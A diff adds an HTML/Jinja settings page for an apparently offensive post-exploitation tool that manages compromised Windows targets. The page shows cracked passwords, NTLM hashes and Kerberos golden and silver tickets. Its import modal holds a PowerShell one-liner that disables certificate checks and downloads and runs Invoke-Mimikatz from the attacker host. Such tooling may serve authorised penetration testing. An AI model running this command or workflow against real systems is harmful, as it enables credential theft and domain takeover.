@@ -1,0 +1,669 @@
+{% extends 'base/authenticated_base.html' %}
+{% block main %}
+<!-- success message -->
+<div id="succeed" class="mt-3 alert alert-success text-center pt-3 w-100 align-self-center" role="alert" style="display: none;">
+  <h4 class="alert-heading" id="succeedAlertHeading"></h4>
+  <p class="mb-0" id="succeedAlertPTag"></p>
+</div>
+<!-- failed message -->
+<div id="error" class="mt-3 alert alert-danger text-center pt-3 w-100 align-self-center" role="alert" style="display: none;">
+  <h4 class="alert-heading" id="failedAlertHeading"></h4>
+  <p class="mb-0" id="failedAlertPTag"></p>
+</div>
+
+<!-- start of "General Settings" -->
+<div class="text-end mt-3">
+  <a href="/api/exportAllSettings" target="_blank"><button type="button" class="btn btn-primary btn-sm me-3">Export All Settings</button></a>
+  <a href="javascript:void(0)"><button type="button" class="btn btn-primary btn-sm" data-bs-toggle="modal" data-bs-target="#importSettingsModal">Import Settings</button></a>
+</div>
+
+<h4 class="pb-2 mb-4 text-danger border-bottom border-danger"><b>Read/Update Settings</b></h4>
+<h5 class="pb-2 mb-4 text-danger border-bottom border-danger"><b>General Settings</b></h5>
+<div class="table-responsive">
+  <table class="table table-bordered">
+    <thead class="table-info">
+      <tr>
+        <th scope="col" class="text-center col-3" style="vertical-align: top;">Description</th>
+        <th scope="col" class="text-center" style="vertical-align: top;">Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <th scope="row">Compromised Target IP Address(es):<br>(Use comma (<code>,</code>) or semicolon (<code>;</code>) for multiple IP addresses<br>e.g.: <code>10.0.0.5,10.0.0.10;10.0.0.11</code>)</th>
+        <td>
+          <div id="generalSettingsTargetIpAddress">
+            <div class="input-group mb-3">
+              <input type="text" class="form-control" id="targetIpAddress" value="{{ currentAppConfig['settings']['generalSettings'].keys() | join(',') }}">
+            </div>
+          </div>
+        </td>
+      </tr>
+      <tr>
+        <th scope="row">Attacker IP Address:<br>(Default network interface: {{ currentAppConfig['settings']['otherGeneralSettings']['attackerNetworkInterface'] }})</th>
+        <td><input type="text" class="form-control" id="attackerIpAddress" value="{{ currentAppConfig['settings']['otherGeneralSettings']['attackerIpAddress'] }}"></td>
+      </tr>
+      <tr>
+        <th scope="row">Password Cracking Wordlist:<br>(Default wordlist: <code>rockyou.txt</code>, fallback wordlist: <code>xato-net-10-million-passwords-10000.txt</code> from <a href="https://github.com/danielmiessler/SecLists/tree/master" target="_blank">SecLists</a>)</th>
+        <td>
+          <label for="formFile" class="form-label">Full path: <code>{{ currentAppConfig['settings']['otherGeneralSettings']['passwordCrackingWordlist'] }}</code></label>
+          <input class="form-control" type="file" id="formFile">
+        </td>
+      </tr>
+      {% if 'tunnelingStatus' in currentAppConfig['settings']['otherGeneralSettings'] %}
+        <tr>
+          <th scope="row">Ligolo-ng Tunneling Status:<br>(Read-only)</th>
+          <td><input type="text" class="form-control" id="tunnelingStatus" value="{{ currentAppConfig['settings']['otherGeneralSettings']['tunnelingStatus'] }}" disabled></td>
+        </tr>
+      {% endif %}
+    </tbody>
+  </table>
+</div>
+
+<h6 class="card-title mt-0">Select a Target:</h6>
+<select class="form-select mb-3" onchange="displayTarget()" name="selectedTargetIpAddress" id="selectedTargetIpAddressDropdown">
+  {% for targetIpAddress, value in currentAppConfig['settings']['generalSettings']|dictsort %}
+    <option value="{{ targetIpAddress }}">{{ targetIpAddress }} (Computer Name: {{ currentAppConfig['settings']['targetComputer'][targetIpAddress]['hostname'] }})</option>
+  {% endfor %}
+</select>
+<div class="border border-danger border-1 mb-4"></div>
+
+{% for targetIpAddress, value in currentAppConfig['settings']['generalSettings']|dictsort %}
+  <div class="table-responsive">
+    <table class="table table-bordered mb-0" name="generalSettingsTable" data-targetIpAddress="{{ targetIpAddress }}" style="display: none;">
+      <thead class="table-info">
+        <tr>
+          <th scope="col" class="text-center col-3" style="vertical-align: top;">Description</th>
+          <th scope="col" class="text-center" style="vertical-align: top;">Value</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <th scope="row">PowerShell Server Listener Port Number:<br>(Default port number: 7331)</th>
+          <td><input type="number" class="form-control" id="powerkatzListenerPortNumber" value="{{ currentAppConfig['settings']['generalSettings'][targetIpAddress]['powerkatzListenerPortNumber'] }}"></td>
+        </tr>
+
+        <tr>
+          <th scope="row">Current Session:</th>
+          <td>
+            <div class="form-check">
+              {% if currentAppConfig['settings']['generalSettings'][targetIpAddress]['currentSession'] == 'shell' %}
+                <input class="form-check-input" type="radio" name="session-{{ targetIpAddress }}" id="shell" value="shell" checked>
+              {% else %}
+                <input class="form-check-input" type="radio" name="session-{{ targetIpAddress }}" id="shell" value="shell">
+              {% endif %}
+              <label class="form-check-label" for="shell">
+                Shell (including reverse, bind, WinRM, and other shells)
+              </label>
+            </div>
+            <div class="form-check">
+              {% if currentAppConfig['settings']['generalSettings'][targetIpAddress]['currentSession'] == 'rdpOrVnc' %}
+                <input class="form-check-input" type="radio" name="session-{{ targetIpAddress }}" id="rdpOrVnc" value="rdpOrVnc" checked>
+              {% else %}
+                <input class="form-check-input" type="radio" name="session-{{ targetIpAddress }}" id="rdpOrVnc" value="rdpOrVnc">
+              {% endif %}
+              <label class="form-check-label" for="rdpOrVnc">
+                RDP/VNC
+              </label>
+            </div>
+
+            {% if currentAppConfig['settings']['generalSettings'][targetIpAddress]['currentSession'] == 'shell' %}  
+              <select class="form-select mt-3" id="shellType-{{ targetIpAddress }}" style="">
+            {% else %}
+              <select class="form-select mt-3" id="shellType-{{ targetIpAddress }}" style="display: none;">
+            {% endif %}
+              {% if currentAppConfig['settings']['generalSettings'][targetIpAddress]['shellType'] == 'Netcat/socat listener (reverse/bind shell)' %}
+                <option value="Netcat/socat listener (reverse/bind shell)" selected="selected">Netcat/socat listener (reverse/bind shell)</option>
+              {% else %}
+                <option value="Netcat/socat listener (reverse/bind shell)">Netcat/socat listener (reverse/bind shell)</option>
+              {% endif %}
+              {% if currentAppConfig['settings']['generalSettings'][targetIpAddress]['shellType'] == 'other' %}
+                <option value="other" selected="selected">Other (e.g. Meterpreter, WinRM, webshell)</option>
+              {% else %}
+                <option value="other">Other (e.g. Meterpreter, WinRM, webshell)</option>
+              {% endif %}
+            </select>
+          </td>
+        </tr>
+
+        {% if currentAppConfig['settings']['generalSettings'][targetIpAddress]['currentSession'] == 'shell' and currentAppConfig['settings']['generalSettings'][targetIpAddress]['shellType'] != 'other' %}
+          <tr name="controllableShellSessionDetails-{{ targetIpAddress }}" style="display: ''">
+            <th scope="row">Shell Listener Port Number:</th>
+            <td><input type="number" class="form-control" id="shellListenerPortNumber-{{ targetIpAddress }}" value="{{ currentAppConfig['settings']['generalSettings'][targetIpAddress]['listenerPortNumber'] }}"></td>
+          </tr>
+          <tr name="controllableShellSessionDetails-{{ targetIpAddress }}" style="display: ''">
+            <th scope="row">Shell PID (Process ID):</th>
+            <td><input type="number" class="form-control" id="shellPid-{{ targetIpAddress }}" value="{{ currentAppConfig['settings']['generalSettings'][targetIpAddress]['shellPid'] }}"></td>
+          </tr>
+          <tr name="controllableShellSessionDetails-{{ targetIpAddress }}" style="display: ''">
+            <th scope="row">Shell Process File Descriptor:</th>
+            <td><input type="number" class="form-control" id="shellFd-{{ targetIpAddress }}" value="{{ currentAppConfig['settings']['generalSettings'][targetIpAddress]['processFd'] }}"></td>
+          </tr>
+        {% else %}
+          <tr name="controllableShellSessionDetails-{{ targetIpAddress }}" style="display: none;">
+            <th scope="row">Shell Listener Port Number:</th>
+            <td><input type="number" class="form-control" id="shellListenerPortNumber-{{ targetIpAddress }}" value=""></td>
+          </tr>
+          <tr name="controllableShellSessionDetails-{{ targetIpAddress }}" style="display: none;">
+            <th scope="row">Shell PID (Process ID):</th>
+            <td><input type="number" class="form-control" id="shellPid-{{ targetIpAddress }}" value=""></td>
+          </tr>
+          <tr name="controllableShellSessionDetails-{{ targetIpAddress }}" style="display: none;">
+            <th scope="row">Shell Process File Descriptor:</th>
+            <td><input type="number" class="form-control" id="shellFd-{{ targetIpAddress }}" value=""></td>
+          </tr>
+        {% endif %}
+
+        <tr>
+          <th scope="row">Initial Setup Completion Status:<br>(Read-only)</th>
+          <td>
+            {% if currentAppConfig['settings']['generalSettings'][targetIpAddress]['setupComplete'] %}
+              <input type="text" class="form-control" id="setupCompletion" value="Completed" disabled>
+            {% else %}
+              <input type="text" class="form-control" id="setupCompletion" value="Not completed" disabled>
+            {% endif %}
+          </td>
+        </tr>
+        <tr>
+          <th scope="row">Powerkatz Server Listener Status:<br>(Read-only)</th>
+          <td>
+            <input type="text" class="form-control" id="listenerStatus" value="{{ currentAppConfig['settings']['generalSettings'][targetIpAddress]['powerkatzServerListenerStatus'] }}" disabled>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+{% endfor %}
+
+<button type="button" class="btn btn-secondary mt-4 w-100 border-secondary fs-4" onclick="updateSettings()">Submit General Settings Changes</button>
+<!-- end of "General Settings" -->
+
+<!-- start of "Target Computer & Current Process Information" -->
+<h4 class="pb-2 mt-4 text-danger border-bottom border-danger"><b>Read-Only Settings</b></h4>
+<h5 class="pb-2 mt-4 text-danger border-bottom border-danger"><b>Target Computer & Current Session Information</b></h5>
+<h5 class="card-title">Select a Target Computer:</h5>
+
+<select class="form-select mb-3" onchange="displayTargetComputerDetails()" name="selectedTargetComputerDetailsIpAddress" id="targetComputerDetailsIpAddressDropdown">
+  {% for targetIpAddress, value in currentAppConfig['settings']['targetComputer']|dictsort %}
+    <option value="{{ targetIpAddress }}" id="hostname-{{ targetIpAddress }}" data-hostname="{{ currentAppConfig['settings']['targetComputer'][targetIpAddress]['hostname'] }}">{{ targetIpAddress }} (Computer Name: {{ currentAppConfig['settings']['targetComputer'][targetIpAddress]['hostname'] }})</option>
+  {% endfor %}
+</select>
+<div class="my-4 border border-danger border-1"></div>
+
+<div class="table-responsive">
+  <table class="table table-bordered">
+    <thead class="table-info">
+      <tr>
+        <th scope="col" class="text-center col-3" style="vertical-align: top;">Description</th>
+        <th scope="col" class="text-center" style="vertical-align: top;">Value</th>
+      </tr>
+    </thead>
+
+    {% for targetIpAddress, value in currentAppConfig['settings']['targetComputer']|dictsort %}
+      <tbody id="targetComputerTableBody" data-targetIpAddress="{{ targetIpAddress }}" style="display: none;">
+        <tr>
+          <th scope="row" class="col-3">Current User:</th>
+          <td><input type="text" class="form-control" id="currentUser-{{ targetIpAddress }}" value="{{ currentAppConfig['settings']['targetComputer'][targetIpAddress]['currentUser'] }}" disabled></td>
+        </tr>
+        <tr>
+          <th scope="row">Computer Architecture:</th>
+          <td><input type="text" class="form-control" id="computerOsArchitechure-{{ targetIpAddress }}" value="{{ currentAppConfig['settings']['targetComputer'][targetIpAddress]['computerOsArchitechure'] }}" disabled></td>
+        </tr>
+        <tr>
+          <th scope="row">Has <code>SeDebugPrivilege</code> User Privilege:<br>(<code>SeDebugPrivilege</code> is required to dump local machine's credentials)</th>
+          <td><input type="text" class="form-control" id="hasDebugPrivilege-{{ targetIpAddress }}" value="{{ currentAppConfig['settings']['targetComputer'][targetIpAddress]['hasDebugPrivilege'] }}" disabled></td>
+        </tr>
+        <tr>
+          <th scope="row">Is Domain-Joined Computer</th>
+          <td><input type="text" class="form-control" id="hasDebugPrivilege-{{ targetIpAddress }}" value="{{ currentAppConfig['settings']['targetComputer'][targetIpAddress]['isDomainJoinedComputer'] }}" disabled></td>
+        </tr>
+      </tbody>
+    {% endfor %}
+  </table>
+</div>
+<!-- end of "Target Computer & Current Process Information" -->
+
+<!-- start of "Target Active Directory Domain Information" -->
+{% set hasDomainJoinedComputers = [] %}
+{% for targetIpAddress, value in currentAppConfig['settings']['targetComputer']|dictsort %}
+  {% set isDomainJoinedComputer = currentAppConfig['settings']['targetComputer'][targetIpAddress]['isDomainJoinedComputer'] %}
+  {% if isDomainJoinedComputer %}
+    {% set _ = hasDomainJoinedComputers.append(isDomainJoinedComputer) %}
+  {% endif %}
+{% endfor %}
+
+{% if hasDomainJoinedComputers %}
+  <h5 class="pb-2 my-4 text-danger border-bottom border-danger"><b>Target Active Directory Domain Information</b></h5>
+  <h5 class="card-title">Select a Domain:</h5>
+  <select class="form-select mb-3" onchange="displayTargetDomainDetails()" name="selectedTargetDomainDetailsDomainName" id="targetDomainDetailsDomainNameDropdown">
+    {% for targetDomain, value in currentAppConfig['settings']['targetDomain']|dictsort %}
+      <option value="{{ targetDomain }}">Domain: {{ targetDomain }}</option>
+    {% endfor %}
+  </select>
+  <div class="my-4 border border-danger border-1"></div>
+
+  <div class="table-responsive">
+    <table class="table table-bordered">
+      <thead class="table-info">
+        <tr>
+          <th scope="col" class="text-center col-3" style="vertical-align: top;">Description</th>
+          <th scope="col" class="text-center" style="vertical-align: top;">Value</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>
+            {% for targetDomain, value in currentAppConfig['settings']['targetDomain']|dictsort %}
+              <tbody id="targetDomainTableBody" data-targetDomainName="{{ targetDomain }}" style="display: none;">
+              {% if currentAppConfig['settings']['targetDomain'][targetDomain]['computers'] %}
+                <tr>
+                  <th scope="row">Computers:</th>
+                  <td>
+                    {% set computersNumber = currentAppConfig['settings']['targetDomain'][targetDomain]['computers']|length %}
+                    {% for computer in currentAppConfig['settings']['targetDomain'][targetDomain]['computers'] %}
+                      <div class="input-group">
+                        <div class="input-group-prepend w-50">
+                          <span class="input-group-text">Computer Name:</span>
+                        </div>
+                        <input type="text" class="form-control" value="{{ computer }}" disabled>
+                      </div>
+                      <div class="input-group">
+                        <div class="input-group-prepend w-50">
+                          <span class="input-group-text">FQDN (Fully Qualified Domain Name):</span>
+                        </div>
+                        <input type="text" class="form-control" value="{{ currentAppConfig['settings']['targetDomain'][targetDomain]['computers'][computer]['dNSHostName'] }}" disabled>
+                      </div>
+                      <div class="input-group">
+                        <div class="input-group-prepend w-50">
+                          <span class="input-group-text">IPv4 Address:</span>
+                        </div>
+                        <input type="text" class="form-control" value="{{ currentAppConfig['settings']['targetDomain'][targetDomain]['computers'][computer]['ipAddress'] }}" disabled>
+                      </div>
+                      {% if loop.index < computersNumber %}
+                        <div class="my-4 border border-danger border-1"></div>
+                      {% endif %}
+                    {% endfor %}
+                    {% if currentAppConfig['settings']['targetDomain'][targetDomain]['networks'] %}
+                      <tr>
+                        <th scope="row">Domain Network Information:</th>
+                        <td>
+                          {% set subnetNumber = currentAppConfig['settings']['targetDomain'][targetDomain]['networks']|length %}
+                          {% for subnetIpAddress in currentAppConfig['settings']['targetDomain'][targetDomain]['networks']%}
+                            <div class="input-group">
+                              <div class="input-group-prepend w-25">
+                                <span class="input-group-text">Subnet:</span>
+                              </div>
+                              <input type="text" class="form-control" value="{{ subnetIpAddress }}/{{ currentAppConfig['settings']['targetDomain'][targetDomain]['networks'][subnetIpAddress]['subnetPrefix'] }}" disabled>
+                            </div>
+                            <div class="input-group">
+                              <div class="input-group-prepend w-25">
+                                <span class="input-group-text">Subnet Mask:</span>
+                              </div>
+                              <input type="text" class="form-control" value="{{ currentAppConfig['settings']['targetDomain'][targetDomain]['networks'][subnetIpAddress]['subnetMask']  }}" disabled>
+                            </div>
+                            {% if loop.index < subnetNumber %}
+                              <div class="my-4 border border-danger border-1"></div>
+                            {% endif %}
+                          {% endfor %}
+                        </td>
+                      </tr>
+                    {% endif %}
+                    {% if currentAppConfig['settings']['targetDomain'][targetDomain]['kerberoastableServiceAccounts'] %}
+                      <tr>
+                        <th scope="row">Kerberoastable Service Accounts:</th>
+                        <td>
+                          {% set kerberoastableServiceAccountNumber = currentAppConfig['settings']['targetDomain'][targetDomain]['kerberoastableServiceAccounts']|length %}
+                          {% for serviceAccountUsername in currentAppConfig['settings']['targetDomain'][targetDomain]['kerberoastableServiceAccounts'] %}
+                            <div class="input-group">
+                              <div class="input-group-prepend w-25">
+                                <span class="input-group-text">Service Account Username:</span>
+                              </div>
+                              <input type="text" class="form-control" value="{{ serviceAccountUsername }}" disabled>
+                            </div>
+                            <div class="input-group">
+                              <div class="input-group-prepend w-25">
+                                <span class="input-group-text">SPNs (Service Principal Names):</span>
+                              </div>
+                              <input type="text" class="form-control" value="{{ currentAppConfig['settings']['targetDomain'][targetDomain]['kerberoastableServiceAccounts'][serviceAccountUsername]['servicePrincipalNames']|join(', ') }}" disabled>
+                            </div>
+                            {% if loop.index < kerberoastableServiceAccountNumber %}
+                              <div class="my-4 border border-danger border-1"></div>
+                            {% endif %}
+                          {% endfor %}
+                        </td>
+                      </tr>
+                    {% endif %}
+                    {% if currentAppConfig['settings']['targetDomain'][targetDomain]['domainSid'] %}
+                      <tr>
+                        <th scope="row">Domain SID (Security Identifier)<br>(Security Identifier &mdash; A unique code assigned to each user, group, or computer in Windows that helps manage access to resources):</th>
+                        <td>
+                          <input type="text" class="form-control" value="{{ currentAppConfig['settings']['targetDomain'][targetDomain]['domainSid'] }}" disabled>
+                      </tr>
+                    {% endif %}
+                  </td>
+                </tr>
+              {% endif %}
+              </tbody>
+            {% endfor %}
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+{% endif %}
+<!-- end of "Target Active Directory Domain Information" -->
+
+<!-- start of "Executor Stored Information" -->
+<h5 class="pb-2 mt-4 text-danger border-bottom border-danger"><b>Executor Stored Information</b></h5>
+<h5 class="card-title">Select an Account:</h5>
+<select class="form-select mb-3" onchange="displayExecutorSettings()" id="executorUserAccountDropDown">
+  {% for username, value in currentAppConfig['settings']['executor']|dictsort %}
+    <option value="{{ username }}">Account: {{ username }} (Domain: {{ currentAppConfig['settings']['executor'][username]['domain'] }})</option>
+  {% endfor %}
+</select>
+<div class="my-4 border border-danger border-1"></div>
+
+<div class="table-responsive">
+  <table class="table table-bordered">
+    <thead class="table-info">
+      <tr>
+        <th scope="col" class="text-center col-3" style="vertical-align: top;">Description</th>
+        <th scope="col" class="text-center" style="vertical-align: top;">Value</th>
+      </tr>
+    </thead>
+    {% for username, value in currentAppConfig['settings']['executor']|dictsort %}
+      <tbody id="executorTableBody" data-username="{{ username }}" style="display: none;">
+        {% if 'clearTextPassword' in currentAppConfig['settings']['executor'][username] %}
+          <tr>
+            <th scope="row">Cleartext Password:<br>(Cracked Password Legend: <span class="bg-success text-white px-2">password</span>)</th>
+            {% if 'isCracked' in currentAppConfig['settings']['executor'][username] %}
+              {% if currentAppConfig['settings']['executor'][username]['isCracked'] == True %}
+                <td><input type="text" class="form-control bg-success text-white" name="executor-{{ username }}" value="{{ currentAppConfig['settings']['executor'][username]['clearTextPassword'] }}" disabled></td>
+              {% else %}
+                <td><input type="text" class="form-control" name="executor-{{ username }}" value="{{ currentAppConfig['settings']['executor'][username]['clearTextPassword'] }}" disabled></td>
+              {% endif %}
+            {% endif %}
+          </tr>
+        {% endif %}
+        {% if 'ntlm' in currentAppConfig['settings']['executor'][username] %}
+          <tr>
+            <th scope="row">NTLM Password Hash:</th>
+            <td><input type="text" class="form-control" name="executor-{{ username }}" value="{{ currentAppConfig['settings']['executor'][username]['ntlm'] }}" disabled></td>
+          </tr>
+        {% endif %}
+        {% if 'kerberoasting' in currentAppConfig['settings']['executor'][username] %}
+          <tr>
+            <th scope="row">Kerberoasting Cleartext Password:<br>(Cracked Password Legend: <span class="bg-success text-white px-2">password</span>)</th>
+            {% if currentAppConfig['settings']['executor'][username]['kerberoasting']['status'] == 'Cracked' %}
+              <td><input type="text" class="form-control bg-success text-white" name="executor-{{ username }}" value="{{ currentAppConfig['settings']['executor'][username]['kerberoasting']['crackedPassword'] }}" disabled></td>
+            {% else %}
+              <td><input type="text" class="form-control" name="executor-{{ username }}" value="{{ currentAppConfig['settings']['executor'][username]['kerberoasting']['crackedPassword'] }}" disabled></td>
+            {% endif %}
+          </tr>
+          <tr>
+            <th scope="row">"Extract & Crack Service Accounts' Password (Kerberoasting)" Base64 TGS Ticket:</th>
+            <td><input type="text" class="form-control" name="executor-{{ username }}" value="{{ currentAppConfig['settings']['executor'][username]['kerberoasting']['base64TgsTicket'] }}" disabled></td>
+          </tr>
+        {% endif %}
+        {% if 'silverTicket' in currentAppConfig['settings']['executor'][username] %}
+          {% set tickets = currentAppConfig['settings']['executor'][username]['silverTicket']['tickets'] %}
+          <tr>
+            <th scope="row">"Impersonate Service Accounts (Silver Ticket Attack)" TGS Ticket(s):</th>
+            <td>
+              {% set ticketsNumber = tickets|length %}
+              {% for ticket in tickets %}
+                <div class="input-group">
+                  <div class="input-group-prepend w-50">
+                    <span class="input-group-text">Service:</span>
+                  </div>
+                  <input type="text" class="form-control" value="{{ ticket['service'] }}" disabled>
+                </div>
+                <div class="input-group">
+                  <div class="input-group-prepend w-50">
+                    <span class="input-group-text">FQDN (Fully Qualified Domain Name):</span>
+                  </div>
+                  <input type="text" class="form-control" value="{{ ticket['target'] }}" disabled>
+                </div>
+                <div class="input-group">
+                  <div class="input-group-prepend w-50">
+                    <span class="input-group-text">Base64 TGS Ticket:</span>
+                  </div>
+                  <input type="text" class="form-control" value="{{ ticket['base64TgsTicket'] }}" disabled>
+                </div>
+                {% if loop.index < ticketsNumber %}
+                  <div class="my-4 border border-danger border-1"></div>
+                {% endif %}
+              {% endfor %}
+            </td>
+          </tr>
+        {% endif %}
+        {% if 'goldenTicket' in currentAppConfig['settings']['executor'][username] %}
+          {% set tickets = currentAppConfig['settings']['executor'][username]['goldenTicket']['tickets'] %}
+          <tr>
+            <th scope="row">"Domain Admins Persistence (Golden Ticket Attack)" TGT Ticket(s):</th>
+            <td>
+              {% set ticketsNumber = tickets|length %}
+              {% for ticket in tickets %}
+                <div class="input-group">
+                  <div class="input-group-prepend w-50">
+                    <span class="input-group-text">Domain:</span>
+                  </div>
+                  <input type="text" class="form-control" value="{{ ticket['domain'] }}" disabled>
+                </div>
+                <div class="input-group">
+                  <div class="input-group-prepend w-50">
+                    <span class="input-group-text">Base64 TGT Ticket:</span>
+                  </div>
+                  <input type="text" class="form-control" value="{{ ticket['base64TgsTicket'] }}" disabled>
+                </div>
+                {% if loop.index < ticketsNumber %}
+                  <div class="my-4 border border-danger border-1"></div>
+                {% endif %}
+              {% endfor %}
+            </td>
+          </tr>
+        {% endif %}
+        {% if 'tickets' in currentAppConfig['settings']['executor'][username] %}
+          {% set tickets = currentAppConfig['settings']['executor'][username]['tickets'] %}
+          <tr>
+            <th scope="row">"Kerberos Ticket Authentication (Pass-the-Ticket)" Ticket(s):</th>
+            <td>
+              {% set ticketsNumber = tickets|length %}
+              {% for ticket in tickets %}
+                <div class="input-group">
+                  <div class="input-group-prepend w-50">
+                    <span class="input-group-text">Service:</span>
+                  </div>
+                  <input type="text" class="form-control" value="{{ ticket['service'] }}" disabled>
+                </div>
+                <div class="input-group">
+                  <div class="input-group-prepend w-50">
+                    <span class="input-group-text">FQDN (Fully Qualified Domain Name):</span>
+                  </div>
+                  <input type="text" class="form-control" value="{{ ticket['target'] }}" disabled>
+                </div>
+                <div class="input-group">
+                  <div class="input-group-prepend w-50">
+                    <span class="input-group-text">Base64 TGS Ticket:</span>
+                  </div>
+                  <input type="text" class="form-control" value="{{ ticket['base64TgsTicket'] }}" disabled>
+                </div>
+                {% if loop.index < ticketsNumber %}
+                  <div class="my-4 border border-danger border-1"></div>
+                {% endif %}
+              {% endfor %}
+            </td>
+          </tr>
+        {% endif %}
+        {% if 'isMachineAccount' in currentAppConfig['settings']['executor'][username] %}
+          <tr>
+            <th scope="row">Is Machine Account:<br>(Machine accounts username ends with <code>$</code>)</th>
+            <td>
+              <select class="form-select" name="executor-{{ username }}" id="isMachineAccount-{{ username }}">
+                {% set isMachineAccount = currentAppConfig['settings']['executor'][username]['isMachineAccount'] %}
+                {% if isMachineAccount == 'Yes' %}
+                  <option value="{{ currentAppConfig['settings']['executor'][username]['isMachineAccount'] }}" selected disabled>{{ currentAppConfig['settings']['executor'][username]['isMachineAccount'] }}</option>
+                  <option value="No" disabled>No</option>
+                {% else %}
+                  <option value="Yes" disabled>Yes</option>
+                  <option value="{{ currentAppConfig['settings']['executor'][username]['isMachineAccount'] }}" selected disabled>{{ currentAppConfig['settings']['executor'][username]['isMachineAccount'] }}</option>
+                {% endif %}
+              </select>
+            </td>
+          </tr>
+        {% endif %}
+      </tbody>
+    {% endfor %}
+  </table>
+</div>
+<!-- end of "Executor Stored Information" -->
+
+<!-- start of "Miscellaneous" -->
+<h4 class="pb-2 mt-4 text-danger border-bottom border-danger"><b>Miscellaneous</b></h4>
+<h5 class="pb-2 my-4 text-danger border-bottom border-danger"><b>Enumerator</b></h5>
+<p class="mb-0">In this section, if you wish to automatically get the latest target computer(s), current session, and target Active Directory domain information, you can click the "Enumerate Again" button. It will collect all the necessary information via the Powerkatz Server Listener.</p>
+<p class="card-title my-0">Enumerates on Target(s):</p>
+<p>
+  {% for targetIpAddress, value in currentAppConfig['settings']['generalSettings']|dictsort %}
+  <span id="enumerateTargetIpAddress-{{ targetIpAddress }}">
+    <input type="checkbox" id="{{ targetIpAddress }}" name="targetIpAddress" value="{{ targetIpAddress }}">
+    <label for="{{ targetIpAddress }}" class="m-2">{{ targetIpAddress }}</label>
+  </span>
+  {% endfor %}
+</p>
+<button type="button" class="btn btn-secondary w-100 border-secondary fs-4" onclick="enumerateComputerDomain()">Enumerate Again</button>
+<!-- end of "Miscellaneous" -->
+
+<!-- start of import settings modal -->
+<div class="modal fade modal-lg" id="importSettingsModal" tabindex="-1">
+  <div class="modal-dialog" id="importSettingsModalDialog">
+    <div class="modal-content">
+      <div class="modal-header" id="importSettingsModalHeader">
+        <h5 class="card-title" id="importSettingsModalTitle">Import Settings</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body" id="importSettingsModalBody">
+        <!-- success message -->
+        <div id="succeedModal" class="mt-3 alert alert-success text-center pt-3 w-100 align-self-center" role="alert" style="display: none;">
+          <h4 class="alert-heading" id="succeedAlertHeadingModal"></h4>
+          <p class="mb-0" id="succeedAlertPTagModal"></p>
+        </div>
+        <!-- failed message -->
+        <div id="errorModal" class="mt-3 alert alert-danger text-center pt-3 w-100 align-self-center" role="alert" style="display: none;">
+          <h4 class="alert-heading" id="failedAlertHeadingModal"></h4>
+          <p class="mb-0" id="failedAlertPTagModal"></p>
+        </div>
+        <!-- pending message -->
+        <div id="pendingModal" class="mt-4 alert alert-info text-center pt-2 w-100 align-self-center" role="alert" style="display: none;">
+          <h4 class="alert-heading" id="pendingAlertHeadingModal"></h4>
+          <p class="mb-0" id="pendingAlertPTagModal"></p>
+        </div>
+
+        <h5 class="card-title" id="importSettingsModalTitle">Select Settings JSON File:</h5>
+        <div class="input-group">
+          <input type="file" class="form-control" id="importSettingsFileInput" aria-describedby="importSettingsSubmitButton" aria-label="Upload" accept=".json,application/json">
+          <button class="btn btn-success" type="button" id="importSettingsSubmitButton" onclick="importSettings(this)">Submit</button>
+        </div>
+        <div class="border border-danger border-1 mt-4"></div>
+
+        <h4 class="pb-2 my-4 text-danger border-bottom border-danger"><b>Note for Importing RDP/VNC and "Other" Shell Session(s)</b></h4>
+        <p>Remember to set up the Powerkatz Server Listener first:</p>
+        <pre class="code"><code class="powershell" id="listenerCodeModal">Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } }'; [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy; $serverListenerString = "IEX (New-Object System.Net.Webclient).DownloadString('https://{{ currentAppConfig['settings']['otherGeneralSettings']['attackerIpAddress'] }}/static/transferFiles/Invoke-Mimikatz.ps1')`n" + '$apiResponse = Invoke-RestMethod -UseBasicParsing -Uri https://{{ currentAppConfig['settings']['otherGeneralSettings']['attackerIpAddress'] }}/api/getKeyIv' + [Environment]::NewLine + (New-Object System.Net.Webclient).DownloadString('https://{{ currentAppConfig['settings']['otherGeneralSettings']['attackerIpAddress'] }}/static/transferFiles/Powerkatz_server.ps1'); Start-Job -Name ServerListener -ScriptBlock { Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } }'; [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy; Invoke-Expression $using:serverListenerString }</code></pre>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- end of import settings modal -->
+
+<script type="text/javascript">
+displayTarget();
+displayTargetComputerDetails();
+displayTargetDomainDetails();
+displayShellTypeSelection();
+displayExecutorSettings();
+
+function displayTarget() {
+  var selectedTargetIpAddressDropdown = document.getElementById("selectedTargetIpAddressDropdown").value;
+  var generalSettingsTables = document.querySelectorAll("table[name=generalSettingsTable]");
+  generalSettingsTables.forEach((table) => {
+  if (selectedTargetIpAddressDropdown === table.dataset.targetipaddress) {
+    table.style.display = "";
+  } else {
+    table.style.display = "none";
+  }
+  });
+};
+
+function displayShellTypeSelection() {
+  var targetIpAddresses = document.getElementById("targetIpAddress").value.split(/[;,]/g);
+  targetIpAddresses.forEach((targetIpAddress) => {
+    var controllableShellSessionDetailsTr = document.querySelectorAll(`tr[name="controllableShellSessionDetails-${targetIpAddress}"]`);
+    var currentSessionRadioButtons = document.querySelectorAll(`input[type="radio"][name="session-${targetIpAddress}"]`);
+    var shellTypeSelect = document.getElementById(`shellType-${targetIpAddress}`);
+    currentSessionRadioButtons.forEach(function(radioButton) {
+      radioButton.addEventListener('change', function() {
+        if (this.checked) {
+          if (this.value === "shell") {
+            shellTypeSelect.style.display = "";
